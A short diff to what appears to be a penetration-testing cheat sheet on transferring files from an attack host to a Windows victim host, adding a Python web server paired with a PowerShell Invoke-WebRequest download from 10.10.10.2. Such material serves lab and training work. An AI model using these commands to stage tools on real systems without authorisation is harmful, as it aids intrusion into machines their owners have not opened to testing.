@@ -17,6 +17,12 @@ $ wget http://10.10.10.2:8000/file.txt
 </pre>
 ### From Attack host to Victim host (Windows)
 * python web server + powershell iwr
+<pre>
+<b># attack machine</b>
+$ python -m http.server 8000
+<b># victim machine</b>
+PS> Invoke-WebRequest -Uri http://10.10.10.2:8000/file.txt -OutFile .\file.txt
+</pre>
 * python web server + certutil
 <pre>
 <b># attack machine</b>
